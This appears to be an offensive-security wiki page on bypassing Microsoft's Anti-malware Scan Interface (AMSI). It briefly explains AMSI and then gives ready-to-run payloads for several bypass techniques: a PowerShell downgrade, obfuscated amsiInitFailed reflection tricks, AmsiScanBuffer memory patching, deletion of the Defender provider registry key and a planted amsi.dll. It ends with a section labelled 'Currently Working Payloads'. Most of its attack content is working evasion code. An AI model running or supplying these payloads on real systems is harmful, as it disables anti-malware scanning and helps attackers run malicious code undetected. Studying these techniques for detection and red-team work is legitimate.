# ⭕ AMSI Bypass

{% embed url="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" %}

Microsoft has developed AMSI (Anti-malware Scan Interface) as a method to defend against common malware execution and protect the end user. By default windows defender interacts with the AMSI API to scan PowerShell scripts, VBA macros, JavaScript and scripts using the Windows Script Host technology during execution to prevent arbitrary execution of code. However, other antivirus products might contain support for AMSI so organizations are not restricted to the use of windows defender.

## How AMSI Works

When a user executes a script or initiates PowerShell, the AMSI.dll is injected into the process memory space. Prior to execution the following two API’s are used by the antivirus to scan the buffer and strings for signs of malware.

1. AmsiScanBuffer()
2. AmsiScanString()

If a known signature is identified execution doesn’t initiate and a message appears that the script has been blocked by the antivirus software. The following diagram illustrates the process of AMSI scanning.

![](<../../.gitbook/assets/image (235).png>)

## AMSI Evasions

Microsoft implemented AMSI as a first defense to stop execution of malware multiple evasions have been publicly disclosed. Since the scan is signature based red teams and threat actors could evade AMSI by conducting various tactics. Even though some of the techniques in their original state are blocked, modification of strings and variables, encoding and obfuscation could revive even the oldest tactics. Offensive tooling also support AMSI bypasses that could be used in red team engagements prior to any script execution but manual methods could be also deployed.

## Tools

| **Tool**                                                                                 | **Description** | **Language**   |
| ---------------------------------------------------------------------------------------- | --------------- | -------------- |
| [AmsiScanBufferBypass](https://github.com/rasta-mouse/AmsiScanBufferBypass)              | Memory Patching | PowerShell, C# |
| [AmsiOpcodeBytes](https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998) | Memory Patching | PowerShell     |
| [AMSI-Bypass](https://gist.github.com/am0nsec/986db36000d82b39c73218facc557628)          | Memory Patching | PowerShell     |
| [AMSI-Bypass](https://gist.github.com/am0nsec/854a6662f9df165789c8ed2b556e9597)          | Memory Patching | C#             |
| [NoAmci](https://github.com/med0x2e/NoAmci)                                              | Memory Patching | C#             |
| [AmsiHook](https://github.com/tomcarver16/AmsiHook)                                      | Hooking         | C++            |

### PowerShell Downgrade

Even though that Windows PowerShell 2.0 has been deprecated by Microsoft it hasn’t been removed from the operating system. Older versions of PowerShell doesn’t contain security controls such as AMSI protection and could be utilized as a form of evasion. Downgrading the PowerShell version to an older version is trivial and requires execution of the following command:

```
powershell -version 2
```

![](<../../.gitbook/assets/image (238).png>)

### Base64 Encoding

Fabian Mosch used an old AMSI bypass of Matt Graeber to prove that if base64 encoding is used on strings (AmsiUtils & amsiInitFailed) that trigger AMSI and decoded at runtime could be used as an evasion defeating the signatures of Microsoft. This technique prevents AMSI scanning capability for the current process by setting the “amsiInitFailed” flag.

#### **Original AMSI Bypass**

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### **Base64 Encoded**

```
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

![](<../../.gitbook/assets/image (239).png>)

### Hooking

Tom Carver created a proof of concept in the form of a DLL file which evades AMSI by hooking into the “AmsiScanBuffer” function. The “AmsiScanBuffer” will then be executed with dummy parameters. The DLL needs to be injected into the PowerShell process which the AMSI bypass will performed.

{% embed url="https://github.com/tomcarver16/SimpleInjector" %}

```
.\SimpleInjector.exe powershell.exe .\AmsiHook.dll
```

![](<../../.gitbook/assets/image (234).png>)

### Memory Patching

Daniel Duggan released an [AMSI bypass](https://github.com/rasta-mouse/AmsiScanBufferBypass) which patches the AmsiScanBuffer() function in order to return always **AMSI\_RESULT\_CLEAN** which indicates that no detection has been found. The patch is displayed in the following line:

```
static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
```

The bypass has been released in C# and PowerShell. The DLL can be loaded and executed with the use of the following commands:

```
[System.Reflection.Assembly]::LoadFile("C:\Users\pentestlab\ASBBypass.dll")
[Amsi]::Bypass()
```

![](<../../.gitbook/assets/image (242).png>)

By default the PowerShell version is getting flagged. The [AMSITrigger](https://github.com/RythmStick/AMSITrigger) could be used to discover strings that are flagged by the AMSI by making calls to the “AmsiScanBuffer”. The following lines have been identified and will need to be obfuscated.

```
.\AmsiTrigger_x64.exe -i .\ASBBypass.ps1
```

![](<../../.gitbook/assets/image (236).png>)

Obfuscating the code contained within the PowerShell script will evade AMSI and perform the memory patching.

```
${_/==\_/\__/===\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgAzADIAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQA=')))
Add-Type ${_/==\_/\__/===\_/}
${__/=\/==\/\_/=\_/} = [Win32]::LoadLibrary("am" + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAC4AZABsAGwA'))))
${___/====\__/=====} = [Win32]::GetProcAddress(${__/=\/==\/\_/=\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGEAbgA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))))
${/==\_/=\/\__/\/\/} = 0
[Win32]::VirtualProtect(${___/====\__/=====}, [uint32]5, 0x40, [ref]${/==\_/=\/\__/\/\/})
${_/\__/=\/\___/==\} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy(${_/\__/=\/\___/==\}, 0, ${___/====\__/=====}, 6)
```

![](<../../.gitbook/assets/image (241).png>)

A slightly different approach to the memory patching technique is to use different machine language instructions (opcodes) as it has been demonstrated in an [article](https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/) to achieve the result of **AMSI\_RESULT\_CLEAN**.

```
.\amsi-opcode.ps1
```

![](<../../.gitbook/assets/image (240).png>)

An alternative [bypass](https://www.contextis.com/us/blog/amsi-bypass) was released by [Paul Laine](https://twitter.com/am0nsec) which modifies the instructions of the [AMSI\_RESULT](https://docs.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi\_result) function in memory to prevent sending the content to windows defender or to any other AMSI provider

```
.\AMSI-Patch.ps1
```

![](<../../.gitbook/assets/image (237).png>)

### Forcing an Error

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Avoiding to use directly the strings with the usage of variables can evade AMSI with the same method.

```
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
```

![](<../../.gitbook/assets/image (243).png>)

Since there is a signature for the “amsiInitFailed” flag, [Adam Chester](https://twitter.com/\_xpn\_) discovered an alternative method which attempt to force a error in order the flag to be set in a legitimate way and not in the console. This bypass allocates a memory region for the “amsiContext” and since the “amsiSession” is set to null will result an error. The discovery has been described in the article “[Exploring PowerShell AMSI and Logging Evasion](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)” in the MDSec website. Using this evasion without any obfuscation will fail as Microsoft has created signatures.

```
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);
```

However an obfuscated version of this bypass exists in the [amsi.fail](https://amsi.fail) website which is maintained by [Melvin Langvik](https://twitter.com/Flangvik) and is displayed also below:

```
	
$fwi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8092-8092));[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$('àmsìSessîõn'.NoRMALiZe([char](70+54-54)+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$([char]([bYtE]0x61)+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))", "NonPublic,Static").SetValue($null, [IntPtr]$fwi);
```

![](<../../.gitbook/assets/image (245).png>)

### Registry Key Modification

AMSI Providers are responsible for the scanning process by the antivirus product and are registered in a location in the registry. The GUID for Windows Defender is displayed below:

```
HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
```

![](<../../.gitbook/assets/image (246).png>)

Removing the registry key of the AMSI provider will disable the ability of windows defender to perform AMSI inspection and evade the control. However, deleting a registry key is not considered a stealthy approach (if there is sufficient monitoring in place) and also requires elevated rights.

```
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
```

![](<../../.gitbook/assets/image (233).png>)

### DLL Hijacking

DLL Hijacking can be also used to evade AMSI from userland as it has been described by [SensePost](https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/). The only requirement is to create a non-legitimate amsi.dll file and plant it on the same folder as PowerShell 64 bit which could be copied to a user writable directory. The proof of concept code has been released by SensePost and is also demonstrated below.

```
#include "pch.h"
#include "iostream"
 
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        LPCWSTR appName = NULL;
        typedef struct HAMSICONTEXT {
            DWORD       Signature;            // "AMSI" or 0x49534D41
            PWCHAR      AppName;           // set by AmsiInitialize
            DWORD       Antimalware;       // set by AmsiInitialize
            DWORD       SessionCount;      // increased by AmsiOpenSession
        } HAMSICONTEXT;
        typedef enum AMSI_RESULT {
            AMSI_RESULT_CLEAN,
            AMSI_RESULT_NOT_DETECTED,
            AMSI_RESULT_BLOCKED_BY_ADMIN_START,
            AMSI_RESULT_BLOCKED_BY_ADMIN_END,
            AMSI_RESULT_DETECTED
        } AMSI_RESULT;
 
        typedef struct HAMSISESSION {
            DWORD test;
        } HAMSISESSION;
 
        typedef struct r {
            DWORD r;
        };
 
        void AmsiInitialize(LPCWSTR appName, HAMSICONTEXT * amsiContext);
        void AmsiOpenSession(HAMSICONTEXT amsiContext, HAMSISESSION * amsiSession);
        void AmsiCloseSession(HAMSICONTEXT amsiContext, HAMSISESSION amsiSession);
        void AmsiResultIsMalware(r);
        void AmsiScanBuffer(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT * result);
        void AmsiScanString(HAMSICONTEXT amsiContext, LPCWSTR string, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT * result);
        void AmsiUninitialize(HAMSICONTEXT amsiContext);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

```
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
```

Executing PowerShell outside of the standard directory will load the amsi.dll file which contains all the necessary functions to operate, however AMSI will not initiated.

![](<../../.gitbook/assets/image (244).png>)

## Currently Working Payloads



```
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

```
[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
```

```
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
```

```
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```
